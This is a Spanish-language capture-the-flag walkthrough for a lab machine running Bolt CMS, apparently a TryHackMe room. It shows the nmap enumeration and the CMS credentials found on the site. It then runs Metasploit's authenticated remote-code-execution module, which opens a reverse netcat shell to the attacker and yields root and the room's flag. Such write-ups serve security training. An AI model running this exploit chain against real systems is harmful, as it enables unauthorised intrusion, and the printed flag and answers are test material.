## Objetivo
## Pistas
## Solución

```

¿Qué número de puerto tiene un servidor web con un CMS ejecutándose?

──(kali㉿kali)-[~]
└─$ nmap -n -Pn -sV 10.10.90.133                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 00:33 EDT
Nmap scan report for 10.10.90.133
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
--- 8000/tcp open  http    (PHP 7.2.32-1)
1 service unrecognized despite returning data. If you know the service/version, please sub

¿Cuál es el nombre de usuario que podemos encontrar en el CMS?

vamos al sitio web

, myself Jake and my username is bolt .

¿Cuál es la contraseña que podemos encontrar para el nombre de usuario?

Hey guys,

i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!

Regards,

Jake (Admin)


¿Qué versión del CMS está instalada en el servidor? (Ej: Nombre 1.1.1)

Intenté buscar en Google la dirección de la página de inicio de sesión predeterminada de Bolt CMS.

http://10.10.90.133:8000/bolt/login

ponemos el usuario y pass que tenemos

vemos que dice en la esquina inferior bolt 3.7.1

Existe un exploit para una versión anterior de este CMS, que permite el acceso remoto autenticado. Encuéntrelo en Exploit DB. ¿Cuál es su EDB-ID?

Busque vulnerabilidades en esta versión del CMS y parece que hay vulnerabilidades allí.

https://www.exploit-db.com/exploits/48296


Metasploit agregó recientemente un módulo de explotación para esta vulnerabilidad. ¿Cuál es la ruta completa de esta explotación? (Ej.: exploit/....)

Nota: Si no puede encontrar el módulo de explotación, lo más probable es que su metasploit no esté actualizado. Ejecute `apt update` y luego `apt install metasploit-framework`


──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       great      Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_upload                                                         
Set the **LHOST, LPORT, RHOST, USERNAME, PASSWORD** in msfconsole before running the exploit

msf6 > use exploit/unix/webapp/bolt_authenticated_rce
[*] Using configured payload cmd/unix/reverse_netcat
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
USERNAME => bolt
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
PASSWORD => boltadmin123
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.140.103
RHOSTS => 10.10.140.103
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.90.133
RHOSTS => 10.10.90.133
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit

[*] Started reverse TCP handler on 10.9.0.84:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "upgg".
[*] Found 3 potential token(s) for creating .php files.
[+] Deleted file hzalkjmah.php.
[+] Deleted file schekcfy.php.
[+] Used token d47f0a8d45097cd80f74ec4bce to create tyvqglfm.php.
[*] Attempting to execute the payload via "/files/tyvqglfm.php?upgg=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.9.0.84:4444 -> 10.10.90.133:50706) at 2024-10-18 00:53:37 -0400
[+] Deleted file tyvqglfm.php.
[+] Reverted user profile back to original state.

Look for flag.txt inside the machine.

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/home/bolt/public/files
find / -name flag.txt
/home/flag.txt
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}


```
## Notas adicionales
## Referencias